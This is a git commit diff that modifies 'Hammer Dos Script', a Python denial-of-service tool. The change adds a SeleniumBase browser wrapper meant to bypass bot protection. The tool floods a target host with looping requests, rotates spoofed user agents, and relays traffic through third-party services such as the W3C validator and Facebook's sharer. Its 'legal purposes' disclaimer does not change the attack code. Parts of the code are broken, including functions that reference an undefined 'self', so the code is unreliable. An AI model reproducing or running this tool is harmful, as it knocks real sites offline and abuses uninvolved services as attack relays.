180073e2b86026a205d9b2e99ff053261b970382
ギドラ <100510131+Scav-engeR@users.noreply.github.com>
2024-03-19 22:57:24 +0800

    added Sbase bypasser

--- hammeryourdistantaunt.py
+++ hammeryourdistantaunt.py
@@ -1,53 +1,70 @@
 #!/usr/bin/python3
 # -*- coding: utf-8 -*-
 
-# Python 3.3.2+ Hammer Dos Script v.1
+# python 3.3.2+ Hammer Dos Script v.1
 # by Scav-engeR
-# Only for legal purposes
+# only for legal purpose
 
-import sys
-import time
-import threading
-import random
 from queue import Queue
 from optparse import OptionParser
-from seleniumbase import BaseCase
+import time, sys, socket, threading, random
+from seleniumbase import BaseCase  # Import SeleniumBase
+import logging  # Import the logging module
 
-class MyTest(BaseCase):
-    def dos(self):
-        while True:
-            self.driver.get(f"http://{host}")
-            print("\033[92m", time.ctime(time.time()), "\033[0m \033[94m <--packet sent! hammering--> \033[0m")
-            time.sleep(0.1)
+def user_agent():
+    global uagent
+    uagent = []
+    uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
+    uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
+    uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
+    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
+    uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
+    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
+    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
+    return uagent
 
-    def dos2(self):
-        while True:
-            self.driver.get(random.choice(bots) + f"http://{host}")
-            print("\033[94mbot is hammering...\033[0m")
-            time.sleep(0.1)
+def my_bots():
+    global bots
+    bots = []
+    bots.append("http://validator.w3.org/check?uri=")
+    bots.append("http://www.facebook.com/sharer/sharer.php?u=")
+    return bots
+
+def dos():
+    while True:
+        item = q.get()
+        self.driver.get(f"http://{host}")
+        print("\033[92m", time.ctime(time.time()), "\033[0m \033[94m <--packet sent! hammering--> \033[0m")
+        time.sleep(0.1)
+        q.task_done()
+
+def dos2():
+    while True:
+        item = w.get()
+        self.driver.get(random.choice(bots) + f"http://{host}")
+        print("\033[94mbot is hammering...\033[0m")
+        time.sleep(0.1)
+        w.task_done()
 
 def usage():
-    print(''' \033[92m Hammer Dos Script v.1 http://www.canyalcin.com/
+    print(''' \033[92m    Hammer Dos Script v.1 http://www.canyalcin.com/
     It is the end user's responsibility to obey all applicable laws.
-    It is just for server testing script. Your IP is visible. \n
-    Usage : python3 hammer.py [-s] [-p] [-t]
-    -h : Help
-    -s : Server IP
-    -p : Port (default 80)
-    -t : Turbo (default 135) \033[0m''')
+    It is just for server testing script. Your ip is visible. \n
+    usage : python3 hammer.py [-s] [-p] [-t]
+    -h : help
+    -s : server ip
+    -p : port default 80
+    -t : turbo default 135 \033[0m''')
     sys.exit()
 
 def get_parameters():
-    global host
-    global port
-    global thr
-    global item
+    global host, port, thr
     optp = OptionParser(add_help_option=False, epilog="Hammers")
-    optp.add_option("-q", "--quiet", help="Set logging to ERROR", action="store_const", dest="loglevel", const=logging.ERROR, default=logging.INFO)
-    optp.add_option("-s", "--server", dest="host", help="Attack to server IP -s IP")
-    optp.add_option("-p", "--port", type="int", dest="port", help="-p 80 (default 80)")
-    optp.add_option("-t", "--turbo", type="int", dest="turbo", help="Default 135 -t 135")
-    optp.add_option("-h", "--help", dest="help", action='store_true', help="Help menu")
+    optp.add_option("-q","--quiet", help="set logging to ERROR", action="store_const", dest="loglevel", const=logging.ERROR, default=logging.INFO)
+    optp.add_option("-s","--server", dest="host", help="attack to server ip -s ip")
+    optp.add_option("-p","--port", type="int", dest="port", help="-p 80 default 80")
+    optp.add_option("-t","--turbo", type="int", dest="turbo", help="default 135 -t 135")
+    optp.add_option("-h","--help", dest="help", action='store_true', help="help you")
     opts, args = optp.parse_args()
     logging.basicConfig(level=opts.loglevel, format='%(levelname)-8s %(message)s')
     if opts.help:
@@ -65,17 +82,33 @@ def get_parameters():
     else:
         thr = opts.turbo
 
-# Reading headers
+# reading headers
 global data
 headers = open("headers.txt", "r")
 data = headers.read()
 headers.close()
-
-# Task queue are q, w
+# task queue are q,w
 q = Queue()
 w = Queue()
 
-if __name__ == '__main__':
+class MyTest(BaseCase):
+    def dos(self):
+        while True:
+            item = q.get()
+            self.driver.get(f"http://{host}")
+            print("\033[92m", time.ctime(time.time()), "\033[0m \033[94m <--packet sent! hammering--> \033[0m")
+            time.sleep(0.1)
+            q.task_done()
+
+    def dos2(self):
+        while True:
+            item = w.get()
+            self.driver.get(random.choice(bots) + f"http://{host}")
+            print("\033[94mbot is hammering...\033[0m")
+            time.sleep(0.1)
+            w.task_done()
+
+if __name__ == "__main__":
     if len(sys.argv) < 2:
         usage()
     get_parameters()
@@ -83,11 +116,6 @@ if __name__ == '__main__':
     print("\033[94mPlease wait...\033[0m")
     user_agent()
     my_bots()
-    time.sleep(5)
-    try:
-        with MyTest() as test:
-            test.dos()
-            test.dos2()
-    except Exception as e:
-        print("\033[91mCheck server IP and port\033[0m")
-        usage()
+    with MyTest() as test:
+        test.dos()
+        test.dos2()
